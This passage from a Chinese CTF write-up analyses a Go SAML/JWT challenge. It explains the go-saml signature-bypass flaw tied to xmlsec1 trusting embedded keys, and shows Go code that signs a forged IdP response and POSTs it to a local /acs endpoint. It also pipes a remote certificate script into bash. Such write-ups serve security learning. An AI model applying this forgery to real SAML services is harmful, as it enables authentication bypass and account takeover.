c.Abort()</span><br><span class="line">            return</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 获取当前时间和JWT过期时间</span><br><span class="line">        currentTime := time.Now().Unix()</span><br><span class="line">        expirationTime := claims.ExpiresAt</span><br><span class="line">        timeSinceExpiration := currentTime - expirationTime</span><br><span class="line"></span><br><span class="line">        // 如果token过期且在24小时内，重新生成token</span><br><span class="line">        if err != nil &amp;&amp; errors.Is(err, jwt.ErrTokenExpired) &#123;</span><br><span class="line">            if timeSinceExpiration &gt;= 0 &amp;&amp; timeSinceExpiration &lt;= 86400 &#123;</span><br><span class="line">                claims.ExpiresAt = time.Now().Add(time.Hour * 24 * 7).Unix() // 续签7天</span><br><span class="line">                tk = jwt.NewWithClaims(jwt.SigningMethodHS256, claims)       // 重新生成JWT</span><br><span class="line">                newToken, _ := tk.SignedString([]byte(secret_key))            // 使用密钥签名新的token</span><br><span class="line">                c.Header(&quot;Authorization&quot;, newToken)                          // 将新的token添加到响应头</span><br><span class="line">                c.Abort()</span><br><span class="line">                return</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                // 如果token过期时间超过24小时，返回错误</span><br><span class="line">                c.JSON(401, gin.H&#123;</span><br><span class="line">                    &quot;message&quot;: err.Error(),</span><br><span class="line">                &#125;)</span><br><span class="line">                c.Abort()</span><br><span class="line">                return</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 将用户名设置到Gin的上下文中供后续路由使用</span><br><span class="line">        c.Set(&quot;username&quot;, claims.Username)</span><br><span class="line">        c.Next() // 继续处理请求</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="环境选择"><a href="#环境选择" class="headerlink" title="环境选择"></a>环境选择</h1><p>kali + goland    不能用goland下载golang</p>
<p>deepin + goland   goland不能读取环境变量</p>
<p>选kali+手动下载GO1.20.1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://mirrors.aliyun.com/golang/go1.20.1.linux-amd64.tar.gz  ; tar -zxvf go1.20.1.linux-amd64.tar.gz;</span><br></pre></td></tr></table></figure>

<p>goland配置代理</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GOPROXY=https://goproxy.io,direct;GOPRIVATE=git.mycompany.com,github.com/my/private</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>安装xmlsec1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install xmlsec1</span><br></pre></td></tr></table></figure>



<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="SAML-术语"><a href="#SAML-术语" class="headerlink" title="SAML 术语"></a><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?spm=a2c6h.12873639.article-detail.27.2515f538c7f477&__biz=MzUzMTA2NTU2Ng==&mid=2247487551&idx=1&sn=18f64ba49f3f0f9d8be9d1fdef8857d9&scene=21#wechat_redirect">SAML 术语</a></h2><ul>
<li>IdP——身份提供者</li>
<li>SP - 服务提供商</li>
<li>用户——使用系统访问服务提供商服务的用户</li>
</ul>
<p>典型的 SAML 工作流由 IdP、SP 和用户组成。用户信息作为断言发送。让我们假设用户有一个 Idp 帐户并拥有有效的凭据</p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzUzMTA2NTU2Ng==&mid=2247487551&idx=1&sn=18f64ba49f3f0f9d8be9d1fdef8857d9&scene=21#wechat_redirect"><img src="/../imgs/$%7Bfiilename%7D/465szxgyid2bk_47a20632ef4e42d9bdda8d05666eafdc.png" alt="image"></a></p>
<p>让我们将上图分解为多个步骤，以便于理解</p>
<ol>
<li>用户转到服务提供商并单击 SAML 登录</li>
<li>SP 将请求重定向到身份提供者</li>
<li>身份提供者向用户显示登录页面以输入凭据</li>
<li>输入凭据后，SAML IdP 会验证其 Active Directory 或数据库中的凭据</li>
<li>验证后，SAML 响应会以 XML 格式发送带有断言，如上所示</li>
<li>然后用户将登录到应用程序</li>
</ol>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>看路由</p>
<h2 id="acs"><a href="#acs" class="headerlink" title="&#x2F;acs"></a>&#x2F;acs</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">r.POST(&quot;/acs&quot;, func(c *gin.Context) &#123;</span><br><span class="line">    // 配置SAML服务提供商的设置</span><br><span class="line">    sp := saml.ServiceProviderSettings&#123;</span><br><span class="line">        PublicCertPath:              &quot;/usr/src/app/cert/default.crt&quot;,          // 公钥证书路径</span><br><span class="line">        PrivateKeyPath:              &quot;/usr/src/app/cert/default.key&quot;,          // 私钥路径</span><br><span class="line">        IDPSSOURL:                   &quot;http://idp/saml2&quot;,                       // 身份提供商的SSO URL</span><br><span class="line">        IDPSSODescriptorURL:         &quot;http://idp/issuer&quot;,                      // 身份提供商的描述符URL</span><br><span class="line">        IDPPublicCertPath:           &quot;/usr/src/app/cert/idpcert.crt&quot;,          // 身份提供商的公钥证书路径</span><br><span class="line">        SPSignRequest:               true,                                     // 是否签署请求</span><br><span class="line">        AssertionConsumerServiceURL: &quot;http://localhost:8000/saml_consume&quot;,     // SP的断言消费者服务URL</span><br><span class="line">    &#125;</span><br><span class="line">    sp.Init() // 初始化SAML服务提供商设置</span><br><span class="line"></span><br><span class="line">    // 从POST表单中获取SAML响应</span><br><span class="line">    encodedXML := c.PostForm(&quot;SAMLResponse&quot;)</span><br><span class="line">    if encodedXML == &quot;&quot; &#123;</span><br><span class="line">        // 如果SAML响应为空，返回错误</span><br><span class="line">        c.JSON(http.StatusBadRequest, gin.H&#123;&quot;error&quot;: &quot;SAMLResponse form value missing&quot;&#125;)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 解析SAML响应</span><br><span class="line">    response, err := saml.ParseEncodedResponse(encodedXML)</span><br><span class="line">    if err != nil &#123;</span><br><span class="line">        // 如果解析失败，返回错误</span><br><span class="line">        c.JSON(http.StatusBadRequest, gin.H&#123;&quot;error&quot;: &quot;SAMLResponse parse: &quot; + err.Error()&#125;)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 验证SAML响应</span><br><span class="line">    err = response.Validate(&amp;sp)</span><br><span class="line">    if err != nil &#123;</span><br><span class="line">        // 如果验证失败，返回错误</span><br><span class="line">        c.JSON(http.StatusBadRequest, gin.H&#123;&quot;error&quot;: &quot;SAMLResponse validation: &quot; + err.Error()&#125;)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 获取SAML响应中的用户标识符uid</span><br><span class="line">    samlID := response.GetAttribute(&quot;uid&quot;)</span><br><span class="line">    if samlID == &quot;&quot; &#123;</span><br><span class="line">        // 如果uid缺失，返回错误</span><br><span class="line">        c.JSON(http.StatusBadRequest, gin.H&#123;&quot;error&quot;: &quot;SAML attribute identifier uid missing&quot;&#125;)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 定义JWT声明，设置过期时间为7天</span><br><span class="line">    claims := MyCustomClaims&#123;</span><br><span class="line">        jwt.StandardClaims&#123;</span><br><span class="line">            ExpiresAt: time.Now().Add(time.Hour * 24 * 7).Unix(), // 过期时间</span><br><span class="line">            Issuer:    &quot;bytectf&quot;,                                  // 发行者</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;guest&quot;, // 用户名</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 使用HS256签名方法生成JWT令牌</span><br><span class="line">    token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)</span><br><span class="line">    tokenString, _ := token.SignedString([]byte(secret_key)) // 使用密钥签名生成token字符串</span><br><span class="line"></span><br><span class="line">    // 返回生成的JWT令牌和随机验证码</span><br><span class="line">    c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">        &quot;token&quot;: tokenString,</span><br><span class="line">        &quot;code&quot;:  random_code,</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>



<p>这块代码初始化SAML服务提供商，解析IDP-&gt;SP返回包以获取用户是否通过认证。通过认证则下发jwt。</p>
<h2 id="admin"><a href="#admin" class="headerlink" title="&#x2F;admin"></a>&#x2F;admin</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// 定义受JWT认证保护的路由组</span><br><span class="line">auth := r.Group(&quot;/&quot;)</span><br><span class="line">auth.Use(jwtauth()) // 使用JWT认证中间件</span><br><span class="line">&#123;</span><br><span class="line">    // 受保护的/admin路由</span><br><span class="line">    auth.GET(&quot;/admin&quot;, func(c *gin.Context) &#123;</span><br><span class="line">        username, _ := c.Get(&quot;username&quot;) // 获取JWT中的用户名</span><br><span class="line">        code := c.Query(&quot;code&quot;)          // 获取请求中的code参数</span><br><span class="line">        if username == &quot;admin&quot; &amp;&amp; code == random_code &#123;</span><br><span class="line">            // 如果用户名为admin且code匹配，返回flag文件内容</span><br><span class="line">            flag, _ := os.ReadFile(&quot;/flag.txt&quot;)</span><br><span class="line">            c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">                &quot;message&quot;: &quot;Welcome, admin! This is flag:&quot; + string(flag),</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            // 否则返回未授权的错误</span><br><span class="line">            c.JSON(http.StatusUnauthorized, gin.H&#123;</span><br><span class="line">                &quot;message&quot;: &quot;Unauthorized&quot;,</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过jwt认证 可以获取flag</p>
<h2 id="jwt认证中间件"><a href="#jwt认证中间件" class="headerlink" title="jwt认证中间件"></a>jwt认证中间件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">func jwtauth() gin.HandlerFunc &#123;</span><br><span class="line">    return func(c *gin.Context) &#123;</span><br><span class="line">        token := c.GetHeader(&quot;Authorization&quot;) // 获取请求头中的Authorization字段</span><br><span class="line">        if token == &quot;&quot; &#123;</span><br><span class="line">            // 如果没有提供token，返回未授权</span><br><span class="line">            c.JSON(401, gin.H&#123;</span><br><span class="line">                &quot;message&quot;: &quot;Unauthorized&quot;,</span><br><span class="line">            &#125;)</span><br><span class="line">            c.Abort() // 中断请求</span><br><span class="line">            return</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        claims := &amp;MyCustomClaims&#123;&#125; // 初始化自定义声明结构</span><br><span class="line">        tk, err := jwt.ParseWithClaims(token, claims, func(token *jwt.Token) (interface&#123;&#125;, error) &#123;</span><br><span class="line">            return []byte(secret_key), nil // 使用密钥解析JWT</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        if err != nil &amp;&amp; !errors.Is(err, jwt.ErrTokenExpired) &#123;</span><br><span class="line">            // 如果解析失败并且不是因为过期错误，返回错误信息</span><br><span class="line">            c.JSON(401, gin.H&#123;</span><br><span class="line">                &quot;message&quot;: err.Error(),</span><br><span class="line">            &#125;)</span><br><span class="line">            c.Abort()</span><br><span class="line">            return</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 获取当前时间和JWT过期时间</span><br><span class="line">        currentTime := time.Now().Unix()</span><br><span class="line">        expirationTime := claims.ExpiresAt</span><br><span class="line">        timeSinceExpiration := currentTime - expirationTime</span><br><span class="line"></span><br><span class="line">        // 如果token过期且在24小时内，重新生成token</span><br><span class="line">        if err != nil &amp;&amp; errors.Is(err, jwt.ErrTokenExpired) &#123;</span><br><span class="line">            if timeSinceExpiration &gt;= 0 &amp;&amp; timeSinceExpiration &lt;= 86400 &#123;</span><br><span class="line">                claims.ExpiresAt = time.Now().Add(time.Hour * 24 * 7).Unix() // 续签7天</span><br><span class="line">                tk = jwt.NewWithClaims(jwt.SigningMethodHS256, claims)       // 重新生成JWT</span><br><span class="line">                newToken, _ := tk.SignedString([]byte(secret_key))            // 使用密钥签名新的token</span><br><span class="line">                c.Header(&quot;Authorization&quot;, newToken)                          // 将新的token添加到响应头</span><br><span class="line">                c.Abort()</span><br><span class="line">                return</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                // 如果token过期时间超过24小时，返回错误</span><br><span class="line">                c.JSON(401, gin.H&#123;</span><br><span class="line">                    &quot;message&quot;: err.Error(),</span><br><span class="line">                &#125;)</span><br><span class="line">                c.Abort()</span><br><span class="line">                return</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 将用户名设置到Gin的上下文中供后续路由使用</span><br><span class="line">        c.Set(&quot;username&quot;, claims.Username)</span><br><span class="line">        c.Next() // 继续处理请求</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>看完整段代码  初步逻辑是伪造IDP-&gt;SP消息，通过认证生成jwt</p>
<h2 id="如何伪造idp-sp-？"><a href="#如何伪造idp-sp-？" class="headerlink" title="如何伪造idp-&gt;sp ？"></a>如何伪造idp-&gt;sp ？</h2><p>正常的流程是 sp收到idp的响应后，用idp的公钥对消息进行签名。</p>
<p><a target="_blank" rel="noopener" href="https://securitylab.github.com/advisories/GHSL-2023-121_go-saml__archived_/">GHSL-2023-121: SAML authentication bypass vulnerability in RobotsAndPencils&#x2F;go-saml - CVE-2023-48703 | GitHub Security Lab</a></p>
<p>xmlsec1的漏洞，还有一个<a target="_blank" rel="noopener" href="https://docs.google.com/document/d/157fGn7lLP1uBuRz8zUgRDWTDklKznljeOWwRQ-C6uFg/edit?usp=sharing">CVE-2021-21239 Report - Google Docs</a></p>
<p>问题来源于 xmlsec1在验证签名1.xml时，如果1.xml里面有公钥信息，会选用1.xml里携带的公钥进行验证。</p>
<p>让我们用go-saml项目示例的代码 学习一下流程</p>
<p><a target="_blank" rel="noopener" href="https://github.com/RobotsAndPencils/go-saml">RobotsAndPencils&#x2F;go-saml: A just good enough SAML client library written in Go.</a></p>
<h3 id="两对密钥"><a href="#两对密钥" class="headerlink" title="两对密钥"></a>两对密钥</h3><p>idp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -sSL https://raw.githubusercontent.com/frntn/x509-san/master/gencert.sh | CRT_CN=&quot;mycert&quot;  bash</span><br><span class="line">/root/GolandProjects/bytectf2024_ezauth/frntn-x509-san.crt</span><br><span class="line">/root/GolandProjects/bytectf2024_ezauth/frntn-x509-san.key</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>sp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用默认的，我的路径为</span><br><span class="line">/root/go/pkg/mod/github.com/!robots!and!pencils/go-saml@v0.0.0-20230606195814-29020529affc/default.crt</span><br><span class="line">/root/go/pkg/mod/github.com/!robots!and!pencils/go-saml@v0.0.0-20230606195814-29020529affc/default.key</span><br></pre></td></tr></table></figure>

<p>证书(Certificate) - *.cer *.crt<br>私钥(Private Key) - *.key</p>
<p>至于pem和der，是编码方式</p>
<p>*.pem - base64编码</p>
<p>*.der - 二进制编码</p>
<h3 id="idp"><a href="#idp" class="headerlink" title="idp"></a>idp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">issuer := &quot;http://localhost:8000/saml&quot;</span><br><span class="line">authnResponse := saml.NewSignedResponse()</span><br><span class="line">authnResponse.Issuer.Url = issuer</span><br><span class="line">authnResponse.Assertion.Issuer.Url = issuer</span><br><span class="line">authnResponse.Signature.KeyInfo.X509Data.X509Certificate.Cert = &quot;stringValueOfCert&quot;</span><br><span class="line">authnResponse.Assertion.Subject.NameID.Value = &quot;userIdThatYouAuthenticated&quot;</span><br><span class="line">authnResponse.AddAttribute(&quot;uid&quot;, &quot;userIdThatYouAuthenticated&quot;)</span><br><span class="line">authnResponse.AddAttribute(&quot;email&quot;, &quot;someone@domain&quot;)</span><br><span class="line">authnResponse.Assertion.Subject.SubjectConfirmation.SubjectConfirmationData.InResponseTo = &quot;authnRequestIdRespondingTo&quot;</span><br><span class="line">authnResponse.InResponseTo = &quot;authnRequestIdRespondingTo&quot;</span><br><span class="line">authnResponse.Assertion.Subject.SubjectConfirmation.SubjectConfirmationData.Recipient = issuer</span><br><span class="line"></span><br><span class="line">// or signed base64 encoded XML string</span><br><span class="line">b64XML, err := authnResponse.EncodedSignedString(&quot;/root/GolandProjects/bytectf2024_ezauth/frntn-x509-san.key&quot;)</span><br><span class="line">b64XML = &quot;SAMLResponse=&quot; + b64XML</span><br><span class="line">// 创建一个POST请求，目标地址是localhost:58080/acs</span><br><span class="line">_, err = http.Post(&quot;http://localhost:58080/acs&quot;, &quot;application/x-www-form-urlencoded&quot;, bytes.NewBufferString(b64XML))</span><br></pre></td></tr></table></figure>

<h3 id="sp"><a href="#sp" class="headerlink" title="sp"></a>sp</h3><p>用题目的</p>
<h3 id="报错1"><a href="#报错1" class="headerlink" title="报错1"></a>报错1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">exit status 1 : /tmp/tmpgs1448165946:3: namespace error : xmlns:saml: Empty XML namespace is not allowed</span><br><span class="line">    &lt;saml:Issuer xmlns:saml=&quot;&quot;&gt;http://localhost:8000/saml&lt;/saml:Issuer&gt;</span><br><span class="line">                              ^</span><br><span class="line">/tmp/tmpgs1448165946:27: namespace error : xmlns:saml: Empty XML namespace is not allowed</span><br><span class="line">        &lt;saml:Issuer xmlns:saml=&quot;&quot;&gt;http://localhost:8000/saml&lt;/saml:Issuer&gt;</span><br><span class="line">                                  ^</span><br><span class="line">func=xmlSecBase64CtxFinal_ex:file=base64.c:line=299:obj=unknown:subj=xmlSecBase64CtxDecodeIsFinished:error=1:xmlsec library function failed: </span><br><span class="line">func=xmlSecBase64Decode_ex:file=base64.c:line=709:obj=unknown:subj=xmlSecBase64CtxFinal_ex:error=1:xmlsec library function failed: </span><br><span class="line">func=xmlSecKeyValueX509XmlReadBase64Blob:file=keysdata.c:line=2118:obj=unknown:subj=xmlSecBase64DecodeInPlace:error=1:xmlsec library function failed:node=X509Certificate</span><br><span class="line">func=xmlSecKeyValueX509XmlRead:file=keysdata.c:line=2283:obj=unknown:subj=xmlSecKeyValueX509XmlReadBase64Blob(cert):error=1:xmlsec library function failed: </span><br><span class="line">func=xmlSecK</span><br></pre></td></tr></table></figure>

<p>存在一些空属性没有赋值，我们看一下NewSignedResponse() 方法，该方法返回的是一个名为 <code>Response</code> 的结构体实例。</p>
<p>示例给的idp代码中的赋值操作，实际上对这个结构体进行修改。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line">func NewSignedResponse() *Response &#123;</span><br><span class="line">	return &amp;Response&#123;</span><br><span class="line">		XMLName: xml.Name&#123;</span><br><span class="line">			Local: &quot;samlp:Response&quot;,</span><br><span class="line">		&#125;,</span><br><span class="line">		SAMLP:        &quot;urn:oasis:names:tc:SAML:2.0:protocol&quot;,</span><br><span class="line">		SAML:         &quot;urn:oasis:names:tc:SAML:2.0:assertion&quot;,</span><br><span class="line">		SAMLSIG:      &quot;http://www.w3.org/2000/09/xmldsig#&quot;,</span><br><span class="line">		ID:           util.ID(),</span><br><span class="line">		Version:      &quot;2.0&quot;,</span><br><span class="line">		IssueInstant: time.Now().UTC().Format(time.RFC3339Nano),</span><br><span class="line">		Issuer: Issuer&#123;</span><br><span class="line">			XMLName: xml.Name&#123;</span><br><span class="line">				Local: &quot;saml:Issuer&quot;,</span><br><span class="line">			&#125;,</span><br><span class="line">			Url: &quot;&quot;, // caller must populate ar.AppSettings.AssertionConsumerServiceURL,</span><br><span class="line">		&#125;,</span><br><span class="line">		Signature: Signature&#123;</span><br><span class="line">			XMLName: xml.Name&#123;</span><br><span class="line">				Local: &quot;samlsig:Signature&quot;,</span><br><span class="line">			&#125;,</span><br><span class="line">			Id: util.ID(),</span><br><span class="line">			SignedInfo: SignedInfo&#123;</span><br><span class="line">				XMLName: xml.Name&#123;</span><br><span class="line">					Local: &quot;samlsig:SignedInfo&quot;,</span><br><span class="line">				&#125;,</span><br><span class="line">				CanonicalizationMethod: CanonicalizationMethod&#123;</span><br><span class="line">					XMLName: xml.Name&#123;</span><br><span class="line">						Local: &quot;samlsig:CanonicalizationMethod&quot;,</span><br><span class="line">					&#125;,</span><br><span class="line">					Algorithm: &quot;http://www.w3.org/2001/10/xml-exc-c14n#&quot;,</span><br><span class="line">				&#125;,</span><br><span class="line">				SignatureMethod: SignatureMethod&#123;</span><br><span class="line">					XMLName: xml.Name&#123;</span><br><span class="line">						Local: &quot;samlsig:SignatureMethod&quot;,</span><br><span class="line">					&#125;,</span><br><span class="line">					Algorithm: &quot;http://www.w3.org/2000/09/xmldsig#rsa-sha1&quot;,</span><br><span class="line">				&#125;,</span><br><span class="line">				SamlsigReference: SamlsigReference&#123;</span><br><span class="line">					XMLName: xml.Name&#123;</span><br><span class="line">						Local: &quot;samlsig:Reference&quot;,</span><br><span class="line">					&#125;,</span><br><span class="line">					URI: &quot;&quot;, // caller must populate &quot;#&quot; + ar.Id,</span><br><span class="line">					Transforms: Transforms&#123;</span><br><span class="line">						XMLName: xml.Name&#123;</span><br><span class="line">							Local: &quot;samlsig:Transforms&quot;,</span><br><span class="line">						&#125;,</span><br><span class="line">						Transform: []Transform&#123;Transform&#123;</span><br><span class="line">							XMLName: xml.Name&#123;</span><br><span class="line">								Local: &quot;samlsig:Transform&quot;,</span><br><span class="line">							&#125;,</span><br><span class="line">							Algorithm: &quot;http://www.w3.org/2000/09/xmldsig#enveloped-signature&quot;,</span><br><span class="line">						&#125;&#125;,</span><br><span class="line">					&#125;,</span><br><span class="line">					DigestMethod: DigestMethod&#123;</span><br><span class="line">						XMLName: xml.Name&#123;</span><br><span class="line">							Local: &quot;samlsig:DigestMethod&quot;,</span><br><span class="line">						&#125;,</span><br><span class="line">						Algorithm: 